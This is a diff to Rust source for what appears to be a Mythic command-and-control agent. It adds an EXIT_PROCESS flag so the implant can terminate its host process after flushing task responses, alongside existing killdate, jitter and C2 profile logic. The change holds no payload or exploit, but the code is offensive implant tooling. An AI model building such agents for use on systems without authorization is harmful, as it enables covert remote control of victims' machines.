@@ -13,7 +13,7 @@ use uuid::Uuid;
 use crate::config::Config;
 use crate::sys::metadata;
 use crate::tasks;
-use crate::{DEBUG, INTERVAL, JITTER, KILLDATE, SHOULD_EXIT, set_killdate, set_sleep};
+use crate::{DEBUG, EXIT_PROCESS, INTERVAL, JITTER, KILLDATE, SHOULD_EXIT, set_killdate, set_sleep};
 
 // ── Helpers ─────────────────────────────────────────────
 
@@ -67,6 +67,14 @@ fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, pending: Vec<Task
         if let Err(e) = get_tasking_with(mythic, 5, c2, pending) {
             eprintln!("[!] flush failed: {e}");
         }
+    }
+}
+
+/// If EXIT_PROCESS is set, terminate the process after flushing responses.
+fn maybe_exit_process() {
+    if EXIT_PROCESS.load(Ordering::Acquire) {
+        println!("[*] exiting process");
+        std::process::exit(0);
     }
 }
 
@@ -160,6 +168,7 @@ pub fn run(config: Config) -> MythicResult<()> {
     if SHOULD_EXIT.load(Ordering::Acquire) {
         let c2 = profiles.choose(&mut rng).unwrap();
         flush_pending(&mythic, c2, pending);
+        maybe_exit_process();
         println!("[*] agent exited (thread)");
         return Ok(());
     }
@@ -170,6 +179,7 @@ pub fn run(config: Config) -> MythicResult<()> {
             println!("[*] past killdate, exiting");
             let c2 = profiles.choose(&mut rng).unwrap();
             flush_pending(&mythic, c2, pending);
+            maybe_exit_process();
             return Ok(());
         }
 
@@ -188,6 +198,7 @@ pub fn run(config: Config) -> MythicResult<()> {
                 if SHOULD_EXIT.load(Ordering::Acquire) {
                     let c2 = profiles.choose(&mut rng).unwrap();
                     flush_pending(&mythic, c2, pending);
+                    maybe_exit_process();
                     println!("[*] agent exited (thread)");
                     return Ok(());
                 }
